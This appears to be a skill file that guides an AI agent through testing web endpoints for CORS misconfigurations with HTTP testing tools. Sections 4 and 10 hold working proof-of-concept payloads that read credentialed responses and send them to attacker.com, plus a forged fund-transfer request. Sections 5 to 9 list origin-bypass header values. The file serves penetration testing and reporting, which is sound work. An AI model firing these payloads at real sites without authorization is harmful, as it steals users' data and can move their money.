# CORS Misconfiguration Detection Skill

## Objective
Identify Cross-Origin Resource Sharing (CORS) misconfigurations that allow unauthorized cross-origin access to sensitive data.

## Instructions

### 1. Identify CORS-Enabled Endpoints
Look for responses with CORS headers:
- `Access-Control-Allow-Origin`
- `Access-Control-Allow-Credentials`
- `Access-Control-Allow-Methods`
- `Access-Control-Allow-Headers`
- `Access-Control-Expose-Headers`

### 2. Test Origin Reflection

**Basic origin reflection:**
```http
GET /api/sensitive HTTP/1.1
Host: vulnerable-website.com
Origin: https://evil.com
```

Check if response reflects the origin:
```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

### 3. Wildcard Origin with Credentials

Check for dangerous wildcard:
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
This is invalid per spec but some servers misconfigure.

### 4. Null Origin Bypass

**Test null origin:**
```http
GET /api/sensitive HTTP/1.1
Host: vulnerable-website.com
Origin: null
```

If response contains:
```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Exploit via sandboxed iframe:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = function() {
    location='https://attacker.com/log?data='+encodeURIComponent(this.responseText);
};
req.open('GET','https://vulnerable-website.com/api/sensitive',true);
req.withCredentials = true;
req.send();
</script>"></iframe>
```

### 5. Subdomain Matching Bypass

Test if subdomains are trusted:
```http
Origin: https://evil.vulnerable-website.com
Origin: https://vulnerable-website.com.evil.com
```

### 6. Prefix/Suffix Matching Bypass

**Test for weak regex:**
```http
Origin: https://vulnerable-website.com.evil.com
Origin: https://evilvulnerable-website.com
Origin: https://vulnerable-website.comevil.com
```

### 7. Protocol Downgrade

**Test HTTP origin on HTTPS site:**
```http
GET /api/sensitive HTTP/1.1
Host: vulnerable-website.com
Origin: http://vulnerable-website.com
```

### 8. Special Characters Bypass

**Test with special characters:**
```http
Origin: https://vulnerable-website.com%60.evil.com
Origin: https://vulnerable-website.com`.evil.com
Origin: https://vulnerable-website.com'.evil.com
Origin: https://vulnerable-website.com!.evil.com
Origin: https://vulnerable-website.com$.evil.com
```

### 9. Internal Network Access

**Test internal origins:**
```http
Origin: http://localhost
Origin: http://127.0.0.1
Origin: http://192.168.1.1
Origin: http://internal.local
```

### 10. Exploitation Scenarios

**Basic CORS exploitation (credentials included):**
```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    // Send data to attacker
    fetch('https://attacker.com/log', {
        method: 'POST',
        body: this.responseText
    });
};
req.open('GET', 'https://vulnerable-website.com/api/user', true);
req.withCredentials = true;
req.send();
</script>
```

**CORS with state-changing requests:**
```html
<script>
var req = new XMLHttpRequest();
req.open('POST', 'https://vulnerable-website.com/api/transfer', true);
req.withCredentials = true;
req.setRequestHeader('Content-Type', 'application/json');
req.send(JSON.stringify({amount: 10000, to: 'attacker'}));
</script>
```

### 11. Preflight Bypass

**Simple requests bypass preflight:**
- GET, HEAD, POST methods only
- Limited headers (Accept, Content-Language, Content-Type)
- Content-Type limited to: application/x-www-form-urlencoded, multipart/form-data, text/plain

**Test if server properly validates preflight:**
```http
OPTIONS /api/sensitive HTTP/1.1
Host: vulnerable-website.com
Origin: https://evil.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Custom-Header
```

### 12. Vary Header Check

Verify server sets `Vary: Origin` header to prevent cache poisoning:
```http
Vary: Origin
```

Without this, cached responses may leak to other origins.

### 13. Risk Assessment

**High Risk:**
- Arbitrary origin reflection with credentials
- Null origin allowed with credentials
- Sensitive API endpoints affected

**Medium Risk:**
- Overly permissive subdomain trust
- HTTP origin trusted on HTTPS site

**Low Risk:**
- Wildcard without credentials (public data)
- Trusted origins only

### 14. Confirm and Document
If confirmed, create finding with:
- Vulnerable endpoint
- Origin validation weakness
- Proof of concept HTML
- Sensitive data accessible
- Impact assessment

## MCP Tools to Use
- `http1_request` / `http2_request`: Test origin variations
- `repeater_tab_with_payload`: Manual testing
- `intruder_prepare`: Automate origin fuzzing
- `issue_create`: Report confirmed finding

## Keywords
cross-origin, cross origin resource sharing

## References
- PayloadsAllTheThings/CORS Misconfiguration
- PortSwigger CORS Research
- OWASP CORS Security
